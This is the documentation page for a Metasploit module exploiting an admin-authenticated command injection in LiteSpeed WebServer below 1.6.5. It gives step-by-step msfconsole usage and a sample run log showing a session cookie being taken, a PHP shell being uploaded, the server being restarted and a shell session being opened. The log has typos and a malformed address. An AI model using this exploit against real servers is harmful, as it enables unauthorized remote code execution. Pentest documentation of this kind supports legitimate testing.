
## Vulnerable Application

This module allows an attacker with a privileged admin account to launch a reverse shell due to a command injection vulnerability in Litespeed WebServer < 1.6.5

This module has been tested successfully on:

* Ubuntu 18.04.4.
* Kali Linux.

## Verification Steps


Metasploit:

1. `./msfconsole`
1. `use exploit/litespeed_webserver_rce`
1. `set rhosts <rhost>`
1. `set rport <rport>`
1. `set username <username>`
1. `set password <password>`
1. `set ssl true`
1. `run`

## Scenarios

### litespeed_webserver_rce.rb on Ubuntu 18.04.4

```
msf6 > use exploit/litespeed_webserver_rce
msf6 auxiliary(exploit/litespeed_webserver_rce) > set rhosts 127.0.0.2
rhosts => 127.0.0.2
msf6 auxiliary(exploit/litespeed_webserver_rcee) > set username admin
USERNAME => admin
msf6 auxiliary(exploit/litespeed_webserver_rcee) > set password admin
PASSWORD => admin
msf6 auxiliary(exploit/litespeed_webserver_rcee) > set ssl true
ssl => true
msf6 auxiliary(exploit/litespeed_webserver_rce) > run

[+] Successfull get cookie: LSWSWEBUL=d97sm1djak12lzjmj23kamd23
[+] Successfull get tk parram: 0.564365723 1732567232
[+] Shell code upload to: /H23azkQyh.php
[+] Waiting for server restart in 5s
[+] Successfull to restart server
[+] Upload shell!
[+] Start shelling!
[+] Started bind TCP handler against 127.0.0.1:4444
[+] Command shell session 1 opened (127.0.0.1.2:40602 -> 127.0.0.1:4444) at 2021-09-30 20:05:04

